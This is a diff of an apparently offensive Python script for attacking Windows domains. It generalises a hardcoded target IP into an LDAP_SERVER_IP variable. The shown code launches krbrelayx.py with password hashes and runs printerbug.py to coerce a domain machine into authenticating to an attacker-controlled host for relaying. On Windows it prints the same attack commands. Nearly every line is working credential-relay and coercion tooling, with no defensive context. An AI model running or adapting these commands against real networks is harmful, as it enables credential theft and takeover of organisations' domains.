@@ -391,12 +391,12 @@ def main():
     if not is_windows:
         os.system("x-terminal-emulator -e python3 krbrelayx.py -hashes %s" % PASSWORD)
         print("\nExeute: Execute coerce attack against: %s" % (ATTACKER_MACHINE))
-        os.system("python3 printerbug.py %s@192.168.117.131 -hashes %s %s" % (USERNAME.replace("\\","/").replace("$", "\\$"), PASSWORD, ATTACKER_MACHINE))
-        print("Executing: python3 printerbug.py %s@192.168.117.131 -hashes %s %s" % (USERNAME.replace("\\","/").replace("$", "\\$"), PASSWORD, ATTACKER_MACHINE))
+        os.system("python3 printerbug.py %s@%s -hashes %s %s" % (USERNAME.replace("\\","/").replace("$", "\\$"), LDAP_SERVER_IP, PASSWORD, ATTACKER_MACHINE))
+        print("Executing: python3 printerbug.py %s@%s -hashes %s %s" % (USERNAME.replace("\\","/").replace("$", "\\$"), LDAP_SERVER_IP, PASSWORD, ATTACKER_MACHINE))
     else:
         print("\nExeute: python3 krbrelayx.py -hashes %s" % PASSWORD)
         print("Execute coerce attack against: %s" % (ATTACKER_MACHINE))
-        print("Example: python3 printerbug.py %s@192.168.117.131 -hashes %s %s" % (USERNAME.replace("\\","/").replace("$", "\\$"), PASSWORD, ATTACKER_MACHINE))
+        print("Example: python3 printerbug.py %s@%s -hashes %s %s" % (USERNAME.replace("\\","/").replace("$", "\\$"), LDAP_SERVER_IP, PASSWORD, ATTACKER_MACHINE))
 
 
     
